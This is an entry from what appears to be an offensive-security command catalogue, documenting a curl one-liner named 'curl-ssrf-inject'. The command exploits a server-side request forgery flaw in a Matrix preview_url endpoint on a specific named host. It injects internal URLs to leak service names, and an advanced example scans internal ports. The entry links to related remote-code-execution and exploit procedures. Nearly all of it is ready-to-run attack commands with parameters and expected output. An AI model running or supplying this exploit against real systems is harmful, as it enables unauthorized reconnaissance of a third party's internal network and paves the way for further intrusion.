---
id: cmd-uuid-001
data: >-
  curl -s --max-time 10
  "https://matrix.redditspace.com/_matrix/media/r0/preview_url/?url=$1" | grep
  og:title
tags:
  - ssrf
  - recon
type: command
output: 'og:title="Internal Service Name"'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows (with curl)
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:48.547Z'
verified: false
validated: true
submitted: true
---
# curl-ssrf-inject

## Command

```bash
curl -s --max-time 10 "https://matrix.redditspace.com/_matrix/media/r0/preview_url/?url=$1" | grep og:title
```

## Description

This command uses curl to send a GET request to the vulnerable Matrix preview_url endpoint, injecting a user-supplied internal URL ($1) to trigger SSRF. It silently fetches the response (-s), times out after 10 seconds to handle hangs, and greps for og:title to extract leaked metadata. Use for blind SSRF testing to enumerate internal services without direct output.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$1` | Internal URL to inject (e.g., http://██████) | Yes |
| `--max-time 10` | Timeout in seconds for hanging requests | No (default 30s) |
| `-s` | Silent mode (no progress bar) | No |
| `| grep og:title` | Filter for leaked metadata | No |

## Examples

### Basic Usage

```bash
curl-ssrf-inject "http://██████"
```

### Advanced Usage

```bash
curl -s --max-time 5 "https://matrix.redditspace.com/_matrix/media/r0/preview_url/?url=http://█████████:8080" | grep -i title
```
Add port for scanning; use -i for case-insensitive grep.

## Expected Output

Description of what output to expect when the command runs successfully.

og:title="███████" (leaked internal service name) or empty if no leak/timeout.

## Related

- [[commands/get-potential-rce]]
- [[procedures/Exploit-Blind-SSRF-in-Matrix-Preview-URL]]
